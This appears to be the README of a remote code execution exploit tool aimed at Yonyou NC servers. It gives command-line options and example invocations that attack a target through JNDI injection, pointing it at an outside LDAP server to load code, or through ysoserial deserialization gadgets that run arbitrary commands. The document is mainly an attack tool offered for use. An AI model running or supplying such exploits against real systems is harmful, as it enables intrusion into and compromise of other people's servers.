# YonyouNC-EXP

```
usage: Options
 -c,--cmd <arg>              Command you wanna execute remotely
 -g,--gadget <arg>           Ysoserial Gadgets
 -h,--help <arg>             Usage of this tool
 -j,--jndiUrl <arg>          JNDI Server URL
 -m,--Exploit Method <arg>   How to RCE the target, value: jndi/serial
 -t,--target <arg>           Exploit target
Example: 
	java  -jar yongyouNC-Exp.jar -t http://1.1.1.1/ -m jndi -j ldap://2.2.2.2/Exp
	java -jar yongyouNC-Exp.jar -t http://1.1.1.1/ -m serial -g CommonsCollections1 -c "ping -n 1 www.qq.com"
```